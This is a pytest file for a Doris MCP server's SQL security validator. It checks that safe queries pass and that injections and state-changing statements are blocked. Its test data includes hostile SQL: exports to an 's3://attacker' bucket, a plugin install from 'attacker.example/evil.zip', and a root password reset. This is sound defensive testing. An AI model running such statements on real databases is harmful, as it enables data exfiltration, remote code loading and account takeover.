#!/usr/bin/env python3
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
"""
SQL security validation tests
"""

import pytest

from doris_mcp_server.utils.security import (
    AuthContext,
    SecurityLevel,
    SQLSecurityValidator,
    ValidationResult,
)


class TestSQLSecurityValidator:
    """SQL security validator tests"""

    @pytest.fixture
    def sql_validator(self, test_config):
        """Create SQL validator instance"""
        return SQLSecurityValidator(test_config)

    @pytest.fixture
    def analyst_context(self):
        """Create analyst auth context"""
        return AuthContext(
            user_id="analyst1",
            roles=["data_analyst"],
            permissions=["read_data"],
            session_id="session_123",
            security_level=SecurityLevel.INTERNAL
        )

    @pytest.mark.asyncio
    async def test_safe_select_query(self, sql_validator, analyst_context, test_sql_queries):
        """Test safe SELECT query validation"""
        sql = test_sql_queries["safe_select"]

        result = await sql_validator.validate(sql, analyst_context)

        assert result.is_valid is True
        assert result.error_message is None

    @pytest.mark.asyncio
    async def test_blocked_drop_operation(self, sql_validator, analyst_context, test_sql_queries):
        """Test blocked DROP operation"""
        sql = test_sql_queries["dangerous_drop"]

        result = await sql_validator.validate(sql, analyst_context)

        assert result.is_valid is False
        assert "blocked operations" in result.error_message.lower()
        assert "DROP" in result.blocked_operations

    @pytest.mark.asyncio
    async def test_sql_injection_detection(self, sql_validator, analyst_context, test_sql_queries):
        """Test SQL injection detection"""
        sql = test_sql_queries["sql_injection"]

        result = await sql_validator.validate(sql, analyst_context)

        assert result.is_valid is False
        assert "injection" in result.error_message.lower()
        assert result.risk_level == "high"

    @pytest.mark.asyncio
    async def test_union_injection_detection(self, sql_validator, analyst_context, test_sql_queries):
        """Test UNION injection detection"""
        sql = test_sql_queries["union_injection"]

        result = await sql_validator.validate(sql, analyst_context)

        assert result.is_valid is False
        assert "injection" in result.error_message.lower()

    @pytest.mark.asyncio
    async def test_comment_injection_detection(self, sql_validator, analyst_context, test_sql_queries):
        """Test comment injection detection"""
        sql = test_sql_queries["comment_injection"]

        result = await sql_validator.validate(sql, analyst_context)

        assert result.is_valid is False
        assert "comment" in result.error_message.lower()

    @pytest.mark.asyncio
    async def test_legitimate_comment_is_allowed(self, sql_validator, analyst_context):
        """Test normal comments are not rejected by substring matches."""
        sql = "SELECT 1 -- order by note"

        result = await sql_validator.validate(sql, analyst_context)

        assert result.is_valid is True

    @pytest.mark.asyncio
    async def test_legitimate_union_is_allowed(self, sql_validator, analyst_context):
        """Test ordinary UNION queries are not rejected as sensitive extraction."""
        sql = "SELECT name FROM users UNION ALL SELECT name FROM archived_users"

        result = await sql_validator.validate(sql, analyst_context)

        assert result.is_valid is True

    @pytest.mark.asyncio
    async def test_union_sensitive_field_injection_is_rejected(self, sql_validator, analyst_context):
        """Test UNION extraction of sensitive fields is rejected."""
        sql = "SELECT name FROM users UNION SELECT password FROM admin_users"

        result = await sql_validator.validate(sql, analyst_context)

        assert result.is_valid is False
        assert "injection" in result.error_message.lower()

    @pytest.mark.asyncio
    async def test_complex_query_validation(self, sql_validator, analyst_context, test_sql_queries):
        """Test complex query validation"""
        sql = test_sql_queries["complex_query"]

        result = await sql_validator.validate(sql, analyst_context)

        # Complex query should pass if within limits
        assert result.is_valid is True

    @pytest.mark.asyncio
    async def test_blocked_keywords_detection(self, sql_validator, analyst_context):
        """Test blocked keywords detection"""
        blocked_sqls = [
            "DELETE FROM users WHERE id = 1",
            "TRUNCATE TABLE logs",
            "ALTER TABLE users ADD COLUMN new_col VARCHAR(50)",
            "CREATE TABLE test (id INT)",
            "INSERT INTO users VALUES (1, 'test')",
            "UPDATE users SET name = 'test' WHERE id = 1"
        ]

        for sql in blocked_sqls:
            result = await sql_validator.validate(sql, analyst_context)
            assert result.is_valid is False
            assert result.blocked_operations is not None
            assert len(result.blocked_operations) > 0

    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT * FROM orders INTO OUTFILE '/tmp/orders'",
            (
                "SELECT * FROM orders INTO OUTFILE 's3://attacker/orders' "
                "PROPERTIES('s3.access_key'='key','s3.secret_key'='secret')"
            ),
            "EXPORT TABLE orders TO 's3://attacker/orders'",
            'ADMIN SET FRONTEND CONFIG ("plugin_enable"="true")',
            "ADMIN SET REPLICA STATUS PROPERTIES('tablet_id'='1','backend_id'='2','status'='ok')",
            "ADMIN CLEAN TRASH",
            "ADMIN REPAIR TABLE orders",
            "SET GLOBAL exec_mem_limit = 137438953472",
            "SET PASSWORD FOR 'root' = PASSWORD('pwned')",
            'INSTALL PLUGIN FROM "http://attacker.example/evil.zip"',
            "UNINSTALL PLUGIN malicious_plugin",
            "BACKUP SNAPSHOT analytics.snapshot TO repository",
            "RESTORE SNAPSHOT analytics.snapshot FROM repository",
            "RECOVER TABLE orders",
            "CANCEL LOAD FROM analytics WHERE LABEL = 'job'",
            "PAUSE ROUTINE LOAD FOR analytics.job",
            "RESUME ROUTINE LOAD FOR analytics.job",
            "STOP ROUTINE LOAD FOR analytics.job",
            "LOAD LABEL analytics.job (DATA INFILE('s3://attacker/data') INTO TABLE orders)",
            "REFRESH CATALOG external_catalog",
        ],
    )
    @pytest.mark.asyncio
    async def test_doris_state_changes_fail_closed(
        self,
        sql_validator,
        analyst_context,
        sql,
    ):
        """Unknown Doris syntax must never inherit read-only status."""
        result = await sql_validator.validate(sql, analyst_context)

        assert result.is_valid is False
        assert result.risk_level == "high"

    @pytest.mark.asyncio
    async def test_table_access_validation(self, sql_validator, analyst_context):
        """Test table access validation"""
        # Test access to sensitive table
        sql = "SELECT * FROM sensitive_data"

        result = await sql_validator.validate(sql, analyst_context)

        # Should fail for non-admin users
        assert result.is_valid is False
        assert "access" in result.error_message.lower()

    def test_extract_table_names(self, sql_validator):
        """Test table name extraction"""
        sql = "SELECT u.name FROM users u JOIN departments d ON u.dept_id = d.id"

        parsed = __import__('sqlparse').parse(sql)[0]
        tables = sql_validator._extract_table_names(parsed)

        # Should extract at least one table name
        assert len(tables) > 0

    @pytest.mark.asyncio
    async def test_malformed_sql_handling(self, sql_validator, analyst_context):
        """Test malformed SQL handling"""
        malformed_sql = "SELECT * FROM users WHERE"

        result = await sql_validator.validate(malformed_sql, analyst_context)

        # Should handle gracefully
        assert isinstance(result, ValidationResult)
